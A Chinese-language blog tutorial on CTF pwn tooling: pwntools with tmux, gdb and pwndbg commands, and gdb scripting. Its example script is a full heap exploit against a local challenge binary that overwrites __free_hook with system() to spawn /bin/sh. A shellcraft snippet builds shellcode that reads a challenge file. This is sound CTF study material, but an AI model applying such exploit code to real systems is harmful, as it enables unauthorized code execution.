---
layout: post
tags: [pwn]
title: "pwntools+tmux & gdb+pwndbg"
date: 2024-7-23
author: wsxk
comments: true
---

- [1. pwntools+tmux](#1-pwntoolstmux)
  - [1.1 pwntools\&tmux 安装教程](#11-pwntoolstmux-安装教程)
  - [1.2 pwntools+tmux联合使用教程](#12-pwntoolstmux联合使用教程)
  - [1.3 tmux快捷键](#13-tmux快捷键)
  - [1.4 pwntools启动gdb并下断点](#14-pwntools启动gdb并下断点)
  - [1.5 pwntools脚本常用代码](#15-pwntools脚本常用代码)
  - [1.6 pwntools生成shellcode](#16-pwntools生成shellcode)
- [2. gdb+pwndbg](#2-gdbpwndbg)
  - [2.1 gdb调试程序命令](#21-gdb调试程序命令)
  - [2.2 gdb常见命令](#22-gdb常见命令)
  - [2.3 gdb script用法](#23-gdb-script用法)
  - [2.4 gdb多线程调试命令](#24-gdb多线程调试命令)
  - [2.5 gdb命令参考文档](#25-gdb命令参考文档)
  - [2.6 pwndbg使用技巧](#26-pwndbg使用技巧)


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>

## 1. pwntools+tmux<br>
在用`pwntools`进行`ctf pwn`题目调试时，通常会利用类似`gdb.attach(p)`的代码来调试，通常情况下，这回弹出另一个命令行<br>
**但是你用tmux来进行调试，它会把一个命令行划分成2个pane，可以同时操作，界面美观还方便**<br>

### 1.1 pwntools&tmux 安装教程<br>
对于`pwntools`而言，只需执行如下命令即可。<br>
```
pip install pwntools
```
对于`tmux`，在`ubuntu20`虚拟机下，执行如下命令：<br>
```
sudo apt install tmux 
```

### 1.2 pwntools+tmux联合使用教程<br>
开启命令行后，使用如下命令:<br>
```shell
tmux
```
这会开启一个`tmux`的服务端<br>
然后，python编写如下代码:<br>
```python
from pwn import *
log.level = "debug"
context.terminal=["tmux","splitw","-h"]

io = process(["./cts","8888"])
p = remote("127.0.0.1","8888")
gdb.attach(io)

p.interactive()
```
**在执行了tmux命令的terminal下执行python3 test.py(上述脚本名称)，即可看到如下视图**<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-3-25/20240723215924.png)
可以看到，使用`gdb.attach(io)`后，直接从当前`terminal`分成2个，方便调试。<br>

### 1.3 tmux快捷键<br>
`tmux`情境下,使用命令前都需要打出`ctrl+b`作为前缀，这里列出比较常用的几个:<br>
```
ctrl+b o : 切换同一个session下的不同pane

tmux detach: 脱离会话，但是会话不会消失
tmux kill-server： 删除所有会话
```
**指导文档:**<br>
[https://matpool.com/supports/doc-tmux-matpool/](https://matpool.com/supports/doc-tmux-matpool/)里有大量的`tmux命令教程`<br>

### 1.4 pwntools启动gdb并下断点<br>
在pwntools下**下断点**可以这么用<br>
```python
gdb.attach(io,"b *$rebase(0x20AF)\nb *$rebase(0x21EE)")
p.interactive() # 保持交互，防止程序退出
```

### 1.5 pwntools脚本常用代码<br>
```python
from pwn import *
context.arch = 'amd64'
context.os = 'linux'
context.log_level="debug"
context.terminal=["tmux","splitw","-h"]

libc_path = "./libc-2.31.so"
libc = ELF(libc_path,checksec=False)
io = process(["./cts","8888"],env={"LD_PRELOAD":libc_path})
p = remote("127.0.0.1","8888")
p_sock = p.sock

r = lambda s      :p.recv(s)
ru = lambda s     :p.recvuntil(s)
rl = lambda       :p.recvline()
s = lambda s      :p.send(s)
sl = lambda s     :p.sendline(s)
sa = lambda a,s   :p.sendafter(a,s)
sla = lambda a,s  :p.sendlineafter(a,s)

def wrap_packet(op,size,content):
    payload = b""
    payload += p64(op)
    payload += p64(size)
    payload += content
    return payload

def create(size,content):
    payload = wrap_packet(0,size,content)
    s(payload)
    sleep(1)
    return

def print_data(idx):
    payload = wrap_packet(2,idx,b"")
    s(payload)
    sleep(1)
    return

def edit(idx,content):
    payload = wrap_packet(3,idx,content)
    s(payload)
    sleep(1)
    return

def free(idx):
    payload = wrap_packet(1,idx,b"")
    s(payload)

def send_oob(idx):
    payload = b""
    payload += p8(idx)
    p_sock.send(payload,socket.MSG_OOB)


main_addr = r(16)[:14]
main_addr = int(main_addr,10)
program_base_addr = main_addr-0x1360
log.info("get main_addr: {}".format(hex(main_addr)))

gdb.attach(io)
pause()
for i in range(10):
    create(0x30,b"\x00"*0x2f)
    sleep(0.5)
for i in range(7):
    free(i)
    sleep(3)
sleep(1)
free(7)
sleep(0.5)
send_oob(7)
sleep(0.5)
send_oob(8) # only idx 9 exists!
sleep(3)
for i in range(3):
    create(0x10,b""*0xf)
    sleep(1)
create(0x10,b"") # idx 3.data_chunk
sleep(1)
create(0x50,b"")
sleep(1)
create(0x50,b"") # idx 5.info_chunk = idx 3.data_chunk
pause()
log.info("program_base_addr: {}".format(hex(program_base_addr)))
stdout_addr = program_base_addr+0x4020
stdout_addr = p64(stdout_addr)
edit(3,stdout_addr)
print_data(5)
pause()

stdout_addr = r(6)
stdout_addr = int.from_bytes(stdout_addr,"little")
log.info("stdout_addr: {}".format(hex(stdout_addr)))
libc_base = stdout_addr -0x1ed6a0
log.info("libc_base:{}".format(hex(libc_base)))
free_hook_addr = libc.sym["__free_hook"] + libc_base
log.info("free_hook_addr:{}".format(hex(free_hook_addr)))

edit(3,p64(free_hook_addr))
edit(5,p64(libc_base+0x52290)) # system addr
edit(9,b"/bin/sh\x00")
# 注意 /bin/sh产生的shell并不在socket中，所以你需要利用文件描述符重定向到socket中
# edit(9,"cat /flag.txt >&4")
send_oob(9)

p.interactive()
```

### 1.6 pwntools生成shellcode<br>
最好还是看看官方文档：[https://pwntools-docs-zh.readthedocs.io/zh-cn/dev/shellcraft.html](https://pwntools-docs-zh.readthedocs.io/zh-cn/dev/shellcraft.html)<br>
```python
from pwn import *
context.arch='amd64' # 设置架构
sh = shellcraft.amd64.linux.cat("/challenge/toddlerone_level1.0",1)
sh_asm = asm(sh)
print(sh_asm) #shellcode的字节码
# b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$j\x02XH\x89\xe71\xf6\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05'
```


## 2. gdb+pwndbg<br>
gdb的可用命令实在是太多了，有很多重要的command，但是你不用就会忘记<br>
所以需要记录一下（之后我好翻哈哈哈）<br>
### 2.1 gdb调试程序命令<br>

|命令| 作用|
|-|-|
|gdb program| 调试程序|


### 2.2 gdb常见命令<br>

|命令| 作用|
|-|-|
|run arg| 不设置断点，直接运行程序|
|start arg| 设置断点在main，并运行至main函数|
|starti arg| 设置断点在_start，并运行至_start函数|
|attach pid| 附加一个正在运行的程序|
|core PATH| 调试程序的dump文件|
|continue (c)| 继续执行程序直到断点|
|info registers| 输出所有寄存器的值|
|print (p) $rdi| 输出rdi寄存器的值，也可以通过p/x $rdi打印十六进制|
|x/nuf address| 查看内存的值，n是数量，u是类型，即b(1 byte)/h(2 bytes)/w(4 bytes)/g(8 bytes), f是格式，即x(十六进制),d(十进制),s(string),i(instruction),address可以是绝对地址，寄存器值，或计算表达式|
|disassemble(disas) main| 反汇编main函数的值|
|set disassembly-flavor intel| 设置反汇编的形式为intel|
|stepi(si) num| 步进，会进入函数调用，num表示步数|
|nexti(ni) num| 步过，不会进入函数调用，num表示步数|
|finish|完成当前函数运行|
|break(b) *address|在地址下断点|
|display/nuf| 每执行完一次指令后显示的内容，nuf参数与x命令相同|
|layout regs|进入TUI（文本用户界面）模式，按ctrl+x+a返回普通模式|
|set expr|设置某个值，比如 set $rdi=0, set *((uint64_t *) $rsp) = 0x1234, set *((uint16_t *) 0x31337000) = 0x1337|
|call (ret type)func(arg) | 直接调用函数|
|set unwindonsignal on| 该选项开启时，gdb在收到信号时，会尝试还原到调用信号前的状态|
|set unwindonsignal off| 该选项关闭时，gdb在收到信号时，会停在收到信号的指令的位置，该指令已经被执行|
|delete(d) num | 删除断点|
|info breakpoints| 查看断点信息|
|backtrace bt| 查看函数调用栈|
|frame f| 查看当前栈帧|
|print p| 打印变量|
|info locals| 查看局部变量|
|thread num| 切换线程|
|until| 执行到指定行|
|info signals| 查看信号|
|handle signal keyword(stop/nostop print/noprint/ pass/nopass)| 处理信号|
|watch expr| 设置写观察点|
|rwatch expr| 设置读观察点|
|awatch expr| 设置读写观察点|

### 2.3 gdb script用法<br>
gdb script文件的语法就是通常的gdb命令，可以使用:<br>
```gdb 
gdb program  -x <PATH_TO_SCRIPT>
```
或者:<br>
```gdb
gdb program -ex <COMMAND>
```
来运行命令，一个`gdb script`的文件可以是如下的形式：<br>
```
set disassembly-flavor intel
start
break *main+709
commands
  silent
  set $local_variable = *(unsigned long long*)($rsi)
  printf "Current value: %llx\n", $local_variable
  continue
end
continuenue
```
另一个形式:<br>
```
start
catch syscall read
commands
  silent
  if ($rdi == 42)
    set $rdi = 0
  end
  continue
end
continue
```

### 2.4 gdb多线程调试命令<br>

|命令          |   作用     |
|-        |-      |
|info threads  |  查看线程ID |
|thread ID(1,2...)| 根据info threads提供的ID号来切换线程|    
|thread apply ID1 ID2 command| 可以让相应线程执行相同的命令|
|thread apply command | 让所以线程执行相同命令 |
|set scheduler-locking off/on/step | 设置调试线程时其他线程的状态（on是只有被调试线程会运行，off是所有线程都执行 |
|b xxxx thread thread-num| 设置线程断点|


### 2.5 gdb命令参考文档<br>
[100个gdb小技巧](https://wizardforcel.gitbooks.io/100-gdb-tips/content/)<br>
上述文档是10年前出的，已经比较老旧了，新的gdb功能就没有记录其中，有一个比较重要的更新：<br>
`non-stop的用法`<br>
```gdb
set non-stop on
set pagination off
set target-async on
```
[https://www.cnblogs.com/WindSun/p/12785322.html](https://www.cnblogs.com/WindSun/p/12785322.html)<br>

### 2.6 pwndbg使用技巧<br>

```
pwndbg界面下:

heap: 查看当前堆情况

arenas： 查看 main_arena的基本信息

arena： 查看main_arena的具体变量信息

fastbins: 查看fastbins里的列表

vmmap： 查看程序内存映射

b *$rebase(offset):非常方便！！在你运行开启了pie和aslr的程序时，不需要你自己计算偏移下断点。
```



